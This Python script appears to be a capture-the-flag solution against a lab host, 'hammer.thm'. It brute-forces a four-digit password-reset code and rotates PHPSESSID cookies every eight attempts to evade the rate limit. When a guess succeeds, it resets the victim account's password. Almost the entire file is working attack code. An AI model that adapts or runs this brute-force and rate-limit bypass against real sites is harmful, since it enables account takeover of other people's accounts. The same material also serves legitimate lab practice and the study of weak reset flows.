'''
NOTE: THIS SCRIPT REQUIRES 'requests' LIBRARY

CODE STRUCTURE
getRandomCode() : Returns four digit code as string
resetRequest(sessionId) : Generates a new code with incremented PHPSESSID
resetPassword(sessionId) : Contain reset password request data 
Main function: bruteforceCode()

I was too lazy to define default headers globally.
'''

import requests
#import threading  #Did not find it necessary to use multithreading
import random

counter = 0 #Will be used to count failed attempts
sessionId_str = '1' + '0'*25 #Create the x26 long PHPSESSID
sessionId = int(sessionId_str) #Will be used to increment PHPSESSID after every 8 failed attempts
needle = 'Invalid or expired' #Used to continue break loop if missing in response
needle2 = 'new_password' #Used to call resetPassword() function when present in the response

def getRandomCode():
    holder = ""
    for i in range(1,5):
        holder += str(random.randrange(0,10)) #Concatinate four digits
    return holder #Returning string because if there is zero in the beginning, it disappears when converted to interger

def resetRequest(sessionId): #POST request with incremented PHPSESSID for new code
    burp0_url = "http://hammer.thm:1337/reset_password.php"
    burp0_cookies = {"PHPSESSID": str(sessionId) }
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://hammer.thm:1337/reset_password.php", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://hammer.thm:1337", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1", "Priority": "u=0, i"}
    burp0_data = {"email": "tester@hammer.thm"}
    print(f"[*] Resetting Request with {sessionId}........")
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

def resetPassword(sessionId): #POST request with new password
    burp0_url = "http://hammer.thm:1337/reset_password.php"
    burp0_cookies = {"PHPSESSID": str(sessionId)}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://hammer.thm:1337/reset_password.php", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://hammer.thm:1337", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1", "Priority": "u=0, i"}
    burp0_data = {"new_password": "Password123!", "confirm_password": "Password123!"}
    print(f"[*] Sending new password request with {burp0_cookies}........")
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    print(f"Password Reset response:-\n{r.text}")

def bruteforceCode():
    global sessionId
    global needle
    global needle2
    global counter
    code = getRandomCode()
    resetRequest(sessionId)
    burp0_url = "http://hammer.thm:1337/reset_password.php"
    burp0_cookies = {"PHPSESSID": str(sessionId)}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://hammer.thm:1337/reset_password.php", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://hammer.thm:1337", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1", "Priority": "u=0, i"}
    burp0_data = {"recovery_code": code, "s": "180"}

    while True:
        print("Attempting : {} | {}".format(burp0_cookies , burp0_data))
        r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        counter += 1 #Increment attempt
        if needle not in r.text:
            print("[$] Potential Success\n{}".format(r.text))
            if needle2 in r.text:
                resetPassword(sessionId) #Pass the current sessionId to use to change password
            break
        else:
            print("[X] Attempt Failed")
            code = getRandomCode() #Get new code as string
            burp0_data.update({"recovery_code": code}) #Update new code for next request

        if counter == 8:    #If 8 attempts made, change PHPSESSID
            sessionId += 1  #Increment PHPSESSID
            burp0_cookies.update({"PHPSESSID": str(sessionId)}) #Update PHPSESSID for next set of requests
            resetRequest(sessionId) #Reset session with new PHPSESSID
            counter = 0 #Reset counter
        
bruteforceCode() #This script won't be very helpful without this function call ¯\_(ツ)_/¯
